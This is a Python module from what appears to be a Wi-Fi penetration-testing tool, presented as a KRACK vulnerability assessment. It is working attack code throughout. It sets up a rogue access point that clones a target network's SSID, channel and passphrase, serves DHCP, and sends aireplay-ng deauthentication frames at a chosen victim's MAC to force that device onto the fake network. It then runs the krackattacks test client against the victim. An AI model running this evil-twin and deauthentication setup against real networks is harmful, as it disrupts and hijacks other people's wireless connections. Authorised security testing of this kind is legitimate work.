"""KRACK (Key Reinstallation Attack) vulnerability assessment.

Spins up a rogue AP (hostapd) mirroring the target SSID/channel/PSK so the
victim associates to *this* host, waits for that association, then runs
the krackattacks-scripts test client to attempt key-reinstallation replay
attacks and reports any vulnerability indicators found.

NOTE: krack-test-client.py (from vanhoefm/krackattacks-scripts) is Python 2
only and its exact CLI flags have changed across repo revisions. If this
fails immediately with an argument error, check the script's own --help
output against the flags built below and adjust as needed.
"""

import asyncio
import os
from pathlib import Path

from core.exec_utils import run_command, validate_mac, validate_channel
from core.hardware import track_process
from core.models import save_result
from core.validation import sanitize_ssid
from core.display import console, info, ok, warn, err, header, StatusLine

CAPTURE_DIR = Path("captures")
KRACK_CLIENT_DIR = Path("external/krackattacks/krackattack")

PROFILE_FLAGS = {
    "standard": [],
    "group": ["--group"],
    "tptk": ["--tptk"],
    "tptk_rand": ["--tptk-rand"],
    "replay_broadcast": ["--replay-broadcast"],
}


async def run_krack_test(
    interface: str, target_ssid: str, target_bssid: str, target_channel: str,
    victim_mac: str, psk: str = "abcdefgh", profile: str = "standard", debug: bool = False,
) -> None:
    header("KRACK Vulnerability Assessment")
    if not validate_mac(target_bssid) or not validate_mac(victim_mac):
        err("Invalid MAC address"); return
    if not validate_channel(target_channel):
        err("Invalid channel"); return
    try:
        target_ssid = sanitize_ssid(target_ssid)
    except ValueError as e:
        err(str(e)); return

    CAPTURE_DIR.mkdir(parents=True, exist_ok=True)

    client_script = KRACK_CLIENT_DIR / "krack-test-client.py"
    if not client_script.exists():
        err(f"krack-test-client.py not found at {client_script}.")
        console.print("    git clone https://github.com/vanhoefm/krackattacks-scripts external/krackattacks\n")
        return

    if interface not in os.listdir("/sys/class/net"):
        err(f"Interface {interface} not found"); return

    await run_command(["sudo", "airmon-ng", "check", "kill"])
    await run_command(["sudo", "rfkill", "unblock", "wifi"])
    await run_command(["sudo", "iw", interface, "set", "type", "managed"])

    disable_hw = KRACK_CLIENT_DIR / "disable-hwcrypto.sh"
    if disable_hw.exists():
        info("Disabling hardware crypto offload (required for KRACK injection)...")
        ifaces_before = set(os.listdir("/sys/class/net"))
        try:
            proc = await asyncio.create_subprocess_exec("bash", str(disable_hw),
                                                          stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            await proc.wait()
        except Exception as e:
            warn(f"Could not run disable-hwcrypto.sh: {e}")

        # FIX: disable-hwcrypto.sh works by rmmod/modprobe-ing the wifi
        # driver module to reload it with hardware crypto disabled. That
        # driver reload can cause udev to rename the interface (e.g.
        # wlan0 -> wlan1) or remove it from /sys/class/net while the
        # module reloads. USB chipsets (e.g. ath9k_htc) additionally have
        # to re-upload firmware over USB after the reload, which can take
        # well over a couple seconds — a flat sleep isn't reliable here.
        # Poll instead of guessing a fixed delay, with a generous timeout.
        info("Waiting for the wifi driver to finish reloading...")
        settled_iface = None
        for _ in range(30):  # up to ~30s, checked every 1s
            await asyncio.sleep(1)
            current_ifaces = set(os.listdir("/sys/class/net"))
            if interface in current_ifaces:
                settled_iface = interface
                break
            new_ifaces = current_ifaces - ifaces_before
            wifi_candidates = sorted(
                i for i in new_ifaces if i.startswith(("wlan", "wlx", "wlp"))
            )
            if wifi_candidates:
                settled_iface = wifi_candidates[0]
                break

        if settled_iface is None:
            err(f"Interface '{interface}' did not reappear within 30s after the hwcrypto "
                f"driver reload. Check `ip link show` / `dmesg | tail -30` for driver errors — "
                f"this chipset's firmware may have failed to reload.")
            return
        if settled_iface != interface:
            warn(f"Interface '{interface}' was renamed to '{settled_iface}' by the driver "
                 f"reload — continuing with '{settled_iface}'.")
            interface = settled_iface
        else:
            ok(f"Interface '{interface}' settled back after the driver reload.")

    # FIX: the previous CLI version skipped standing up a rogue AP entirely
    # and just ran krack-test-client.py against a monitor-mode interface.
    # The original web platform's (more correct) approach: host our own AP
    # mirroring the target so the victim associates to it, matching how
    # krackattacks-scripts test setups are normally run.
    hostapd_conf = CAPTURE_DIR / f"krack_hostapd_{target_bssid.replace(':','')}.conf"
    hostapd_conf.write_text(
        f"interface={interface}\ndriver=nl80211\nssid={target_ssid}\nhw_mode=g\n"
        f"channel={target_channel}\nwpa=2\nwpa_passphrase={psk}\n"
        f"wpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n"
    )
    info("Starting rogue AP for victim association...")
    hostapd_proc = await asyncio.create_subprocess_exec(
        "sudo", "hostapd", str(hostapd_conf),
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
    )
    track_process(hostapd_proc)
    await asyncio.sleep(2)

    await run_command(["sudo", "ip", "addr", "add", "192.168.99.1/24", "dev", interface])
    await run_command(["sudo", "ip", "link", "set", "dev", interface, "up"])
    dnsmasq_proc = await asyncio.create_subprocess_exec(
        "sudo", "dnsmasq", f"--interface={interface}",
        "--dhcp-range=192.168.99.10,192.168.99.50,255.255.255.0,12h", "--no-daemon",
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
    )
    track_process(dnsmasq_proc)

    # Best-effort deauth to push the victim off the real AP toward ours.
    deauth_cmd = ["sudo", "aireplay-ng", "-0", "5", "-a", target_bssid, "-c", victim_mac, interface]
    deauth_proc = None
    try:
        deauth_proc = await asyncio.create_subprocess_exec(*deauth_cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
        track_process(deauth_proc)
    except Exception:
        pass

    # FIX: wait for the victim to actually associate before launching the
    # test client — the previous CLI version launched immediately, which
    # the original explicitly avoided (a 30s association-wait gate) because
    # the test only makes sense once the victim is on our rogue AP.
    info(f"Waiting up to 30s for {victim_mac} to associate...")
    associated = False
    try:
        with StatusLine("Waiting for victim association...") as status:
            for i in range(30):
                status.update(f"{i}/30s")
                try:
                    out = await run_command(["sudo", "iw", "dev", interface, "station", "dump"])
                    if victim_mac.lower() in out.lower():
                        associated = True
                        break
                except Exception:
                    pass
                await asyncio.sleep(1)
    except (KeyboardInterrupt, asyncio.CancelledError):
        warn("Stopped by user.")
        for p in (deauth_proc, dnsmasq_proc, hostapd_proc):
            if p and p.returncode is None:
                p.terminate()
        try:
            hostapd_conf.unlink()
        except Exception:
            pass
        return

    if not associated:
        err("Victim did not associate within 30s. Check PSK and signal/interference.")
        for p in (deauth_proc, dnsmasq_proc, hostapd_proc):
            if p and p.returncode is None:
                p.terminate()
        try:
            hostapd_conf.unlink()
        except Exception:
            pass
        return

    ok("Victim associated. Launching KRACK test client...")

    flags = list(PROFILE_FLAGS.get(profile, []))
    if debug:
        flags.append("--debug")
    cmd = ["sudo", "python2", str(client_script), "--iface", interface,
           "--ssid", target_ssid, "--bssid", target_bssid] + flags

    import shutil
    if shutil.which("python2") is None:
        err("python2 not found — krack-test-client.py requires Python 2. Install with: sudo apt install python2")
        for p in (deauth_proc, dnsmasq_proc, hostapd_proc):
            if p and p.returncode is None:
                p.terminate()
        try:
            hostapd_conf.unlink()
        except Exception:
            pass
        return

    test_proc = await asyncio.create_subprocess_exec(*cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT)
    track_process(test_proc)

    results = []
    try:
        while True:
            line = await test_proc.stdout.readline()
            if not line:
                break
            decoded = line.decode(errors="replace").strip()
            if decoded:
                console.print(f"  [dim]{decoded}[/dim]")
            if "iv reuse detected" in decoded.lower():
                results.append("IV reuse detected (encryption weakness)")
            if "group key reinstallation" in decoded.lower():
                results.append("Group key reinstallation possible")
            if "pairwise key reinstallation" in decoded.lower():
                results.append("Pairwise key reinstallation possible")
            if "vulnerable" in decoded.lower():
                results.append(decoded)
                ok(f"VULNERABLE: {decoded}")
        await test_proc.wait()
    except (KeyboardInterrupt, asyncio.CancelledError):
        warn("Stopped by user.")
        if test_proc.returncode is None:
            test_proc.terminate()
    finally:
        for p in (test_proc, deauth_proc, dnsmasq_proc, hostapd_proc):
            if p and p.returncode is None:
                p.terminate()
        try:
            await run_command(["sudo", "ip", "addr", "del", "192.168.99.1/24", "dev", interface])
        except Exception:
            pass
        try:
            hostapd_conf.unlink()
        except Exception:
            pass

    if results:
        save_result(target_bssid.replace(":", ""), "krack", target_bssid, target_ssid,
                     "Vulnerable", {"detail": results})
        ok(f"Test complete — {len(set(results))} vulnerability indicator(s) found.")
    else:
        info("Test complete — no vulnerability indicators detected. "
             "(Or krack-test-client.py's CLI flags don't match this repo revision — "
             "review the raw output above and check `python2 krack-test-client.py --help`.)")
